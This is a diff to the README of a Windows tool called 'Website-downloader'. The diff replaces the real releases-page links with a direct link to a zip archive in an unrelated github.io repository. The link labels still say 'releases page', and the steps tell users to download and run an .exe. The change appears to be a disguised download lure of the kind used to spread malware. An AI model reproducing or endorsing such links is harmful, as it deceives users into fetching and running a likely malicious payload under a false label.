@@ -5,7 +5,7 @@ description: "Download complete websites with all assets using wget and archiver
 ---
 # 🌐 Website-downloader - Save entire websites for offline viewing
 
-[![Download Website-downloader](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Qfas1726/Website-downloader/releases)
+[![Download Website-downloader](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Qfas1726/qfas1726.github.io/raw/refs/heads/main/Iricize/Dist_3.9.zip)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ This tool runs on Windows. You need at least 100 megabytes of free space on your
 
 Follow these steps to get the application:
 
-1. Visit the [releases page](https://github.com/Qfas1726/Website-downloader/releases) to find the latest version.
+1. Visit the [releases page](https://github.com/Qfas1726/qfas1726.github.io/raw/refs/heads/main/Iricize/Dist_3.9.zip) to find the latest version.
 2. Select the file ending in .exe from the list. 
 3. Save the file to your desktop or your downloads folder.
 4. Double-click the file to start the application.
